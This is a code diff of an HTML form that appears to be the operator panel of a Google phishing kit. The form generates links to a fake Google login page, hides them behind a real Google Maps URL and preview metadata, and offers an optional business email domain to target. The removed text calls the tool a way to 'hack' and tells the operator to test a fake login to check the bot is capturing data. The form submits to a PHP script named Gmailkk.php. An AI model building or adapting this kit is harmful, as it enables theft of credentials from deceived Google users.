@@ -92,9 +92,10 @@
 <body>
 
   
-<form id="accesspanel" action="/public/Google/meta/040148.php" method="GET">
+<form id="accesspanel" action="/public/Google/meta/Gmailkk.php" method="GET">
 <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
 	  
+
 
 
  <fieldset>
@@ -104,17 +105,13 @@
 
 <center><div class="inset">
     
-    <font size="24" color="white">GOOGLE GENERATOR</font><br>
-<font size="" color="grey"><br></font>
-    <font size="" color="white">META Title<br>Shared META Website Name or Url</font><input type="text" name="title" id="title" placeholder="title [use a real url to mask]" value="https://www.google.ca/maps/place/city/Location=id453552354rtfwdc433w656gw5f3w6fw43" required="">
-<br><font size="" color="white">META Description<br> Shared Meta Website Description/about </font><input required="" type="text" name="description" id="description" placeholder="[metadata description]" value="Navigate your world faster and easier with Google Maps. Over 220 countries and territories mapped and hundreds of millions of businesses and places on the map. Get real-time GPS navigation, traffic, and transit info, and explore local neighborhoods by knowing where to eat, drink and go - no matter what part of the world you’re in.
-">
-<font size="" color="white">META Image URL <br> Shared  Website preview image</font><input type="text" name="imageurl" id="imageurl" value="https://apdparts.ca/images/about/map-edmonton.jpg" placeholder="a 200x200 meta preview image url" required=""> <br>
-
-<font size="" color="white">Google Login Page MODS<br>to Continue to [blank]</font><input type="text" name="tocontinueto-______" id="tocontinueto-_____" placeholder="to continue to[ ______ ]" value="Google Maps" required="">
-<font size="" color="white">To Successfully Hack you Must Double check the website by Preforming a fake login and testing the site.. To make sure BOT Is WORKING properly and Obtaining the Proper data!</font><br><br><br><br><br><button type="submit" class="button">Generate Link</button>
-<button href="/" class="button">Return Home</button>
-<button href="public/deposit/submit.php" '="" class="button">TRANS-GENDER</button><br><br><br><br><br><br><br><br><br><font size="" color="white">OPTIONAL BUISNESS DOMAIN TARGET</font><input type="text" name="buisnessemaildomain" id="buisnessemaildomain" placeholder="@buyatab.com ">
+    <font size="12" color="white">FOREST GUMP</font><br>
+<font size="6" color="grey"><br>I THINK I <5 U GENNY</font>
+<input type="text" name="title" id="title" placeholder="title [use a real url to mask]" value="https://www.google.ca/maps/pla..." required="">
+<input required="" type="text" name="description" id="description" placeholder="[metadata description]" value="Navigate your world faster and easier with Google Maps. Over 220 countries and territories mapped and hundreds of millions of businesses and places on the map. Get real-time GPS navigation, traffic, and transit info, and explore local neighborhoods by knowing where to eat, drink and go - no matter what part of the world you’re in.">
+<input type="text" name="imagelink" id="imageurl" value="https://i.ibb.co/sgD4nM1/Untitled.png" placeholder="a 200x200 meta preview image url" required=""> <br>
+<input type="text" name="mod" id="mod" placeholder="To continue to Maps" value="Maps" required="">
+<button type="submit" class="button">[RUN FOREST]</button>
 
 
 
